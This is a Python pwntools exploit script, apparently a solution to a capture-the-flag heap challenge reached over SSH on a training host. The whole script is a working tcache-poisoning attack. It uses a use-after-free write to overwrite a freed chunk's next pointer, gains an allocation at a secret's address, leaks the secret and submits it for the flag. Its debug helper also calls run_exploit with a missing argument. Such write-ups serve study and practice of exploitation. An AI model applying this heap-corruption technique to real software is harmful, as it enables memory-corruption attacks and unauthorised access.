#!/usr/bin/env python

from pwn import *

get_flag = True
chall_name = '6.0'

context.arch = "amd64"

def run_with_gdb(p):
    gdb.attach(p,'''
    b *main''')
    run_exploit(p)

def run_commands_list(commands, p):
    for command in commands:
        print('COMMAND: ', command)
        print_send_print(command, p)

def print_send_print(line_to_send, p):
    p.sendline(line_to_send)
    if get_flag:
        print(p.recvrepeat(1).decode())
    else:
        print(p.recvrepeat(0.2).decode())

def get_address(output):
    address_start = output.find('0x')
    address_ends = output.find('.', address_start)
    address = output[address_start:address_ends]
    print('Address found: ', address)
    #return p64(int(address, 16))
    return p64(int('0x429737', 16))

def get_secret_from_output(output):
    start_search_string = 'Data: '
    secret_start = output.find(start_search_string) + len(start_search_string)
    secret_ends = output.find('\n', secret_start)
    return output[secret_start:secret_ends]

def run_exploit(p, debug):
    if debug:
        run_with_gdb(p)

    # send_flag asks for a "secret", the "secret" memory address is showed in the
    # first run of the program.

    # scanf uses a pointer to a freed chunk of memory, so we can use this flaw
    # to overwrite a "NEXT" pointer of a chunk and point a freed chunk to
    # the address of the "secret", the password for the command send_flag.

    welcome_message = p.recvrepeat(1).decode()
    print(welcome_message)
    secret_addres = get_address(welcome_message) # getting the secret address

    commands = [
                b'malloc 0 100', # make two allocations
                b'malloc 1 100',
                b'free 0', # free the allocations
                b'free 1',
                # uses scanf to overwrite a "NEXT" address of a chunk with the secret_address
                b'scanf 1 ' + secret_addres,
                # get the first chunk, hes not the one pointing to secret, hes the one with the
                # corrupted "NEXT", poiting to secret
                b'malloc 0 100', 
                # get the next chunk, hes poiting to the secret
                b'malloc 0 100', 
                ]

    run_commands_list(commands, p)

    p.sendline(b'puts 0') # the allocation 0 now is poiting to the secret
    leaked_secret_output = p.recvrepeat(1).decode()
    secret = get_secret_from_output(leaked_secret_output)

    # send secret with send_flag to get the flag
    p.sendline('send_flag ' + secret)
    print(p.recvrepeat(1).decode())

    p.close()

if get_flag:
    ssh_connection = ssh(host='college',user='hacker')
    process_full_path = '/challenge/' + chall_name
    p = ssh_connection.run(process_full_path)
    run_exploit(p, False)
    ssh_connection.close()
else:
    p = process('./' + chall_name)
    run_exploit(p, False)
